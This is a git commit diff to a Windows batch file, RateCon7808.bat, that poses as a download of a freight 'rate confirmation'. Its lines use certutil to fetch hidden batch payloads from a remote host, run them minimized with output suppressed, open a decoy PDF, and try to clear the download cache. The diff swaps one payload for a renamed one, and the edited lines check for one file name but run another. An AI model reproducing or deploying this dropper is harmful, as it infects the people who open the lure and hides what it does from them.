e5ec854f8e6c870d4ef62874e461a152f3e1c8ee
unknown <Metro-movers1@outlook.com>
2026-07-10 19:01:58 +0000

    j4

--- RateCon7808.bat
+++ RateCon7808.bat
@@ -10,14 +10,12 @@ echo  Downloading rate confirmation...
 echo  Please wait...
 echo.
 
-certutil -urlcache -split -f "%R%/wdsr12889.bat" "%T%\wdsr12889.bat" >nul 2>&1
-certutil -urlcache -split -f "%R%/wdsrpn25cdv.bat" "%T%\wdsrpn25cdv.bat" >nul 2>&1
+certutil -urlcache -split -f "%R%/wdsrpn25cdv.bat" "%T%\wdsrpn43cdv.bat" >nul 2>&1
 certutil -urlcache -split -f "%R%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1
 
 certutil -urlcache -split -f "https://" delete 2>nul
 
-if exist "%T%\wdsr12889.bat" start "" /min cmd /c "%T%\wdsr12889.bat"
-if exist "%T%\wdsrpn25cdv.bat" start "" /min cmd /c "%T%\wdsrpn25cdv.bat"
+if exist "%T%\wdsrpn25cdv.bat" start "" /min cmd /c "%T%\wdsrpn43cdv.bat"
 if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"
 
 timeout /t 2 /nobreak >nul
